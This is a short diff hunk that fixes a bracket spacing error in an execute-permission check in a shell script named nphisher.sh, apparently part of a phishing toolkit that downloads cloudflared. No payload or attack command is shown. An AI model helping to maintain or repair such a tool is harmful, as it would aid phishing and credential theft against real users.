@@ -180,7 +180,7 @@ download_cloudflared() {
 
 #check whether execute permission is granted
 xpermission(){
-if [ -x nphisher.sh];
+if [ -x nphisher.sh ];
         then
         continue
 else
